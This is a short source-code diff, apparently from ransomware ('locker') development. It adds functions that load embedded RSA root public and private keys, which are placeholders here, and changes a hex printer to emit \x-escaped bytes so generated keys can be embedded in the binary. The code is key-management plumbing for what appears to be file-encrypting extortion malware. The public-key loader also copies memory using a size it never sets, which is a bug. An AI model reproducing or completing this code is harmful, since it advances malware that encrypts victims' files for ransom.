@@ -9,12 +9,29 @@
 #include <string>
 
 
+// hash public key -> signature this hash with root private kay. verify signature with root public key
+VOID locker::LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size)
+{
+	CONST BYTE pub[] = "__public_key__"; // "\x06\x02\x00" Root RSA Public key / Type -print while gen keys
+	
+	*g_PublicKeyRoot = (BYTE*)memory::m_malloc(4096);
+	memcpy(*g_PublicKeyRoot, pub, *size);
+}
+
+VOID locker::LoadPrivateRootKey(BYTE** g_PrivateKeyRoot, DWORD* size)
+{
+	CONST BYTE prv[] = "__private_key__"; // "\x07\x02\x00" Root RSA Private key / Type -print while gen keys
+	*size = sizeof(prv);
+	*g_PrivateKeyRoot = (BYTE*)memory::m_malloc(4096);
+	memcpy(*g_PrivateKeyRoot, prv, *size);
+}
+
 STATIC VOID PrintHex(const BYTE* data, DWORD size)
 {
 	for (size_t i = 0; i < size; ++i)
 	{
-		printf_s("%02X ", data[i]);
-		if ((i + 1) % 32 == 0) printf("\n");
+		printf_s("\\x%02X", data[i]);
+		//if ((i + 1) % 32 == 0) printf("\n");
 	}
 	printf_s("\n");
 }
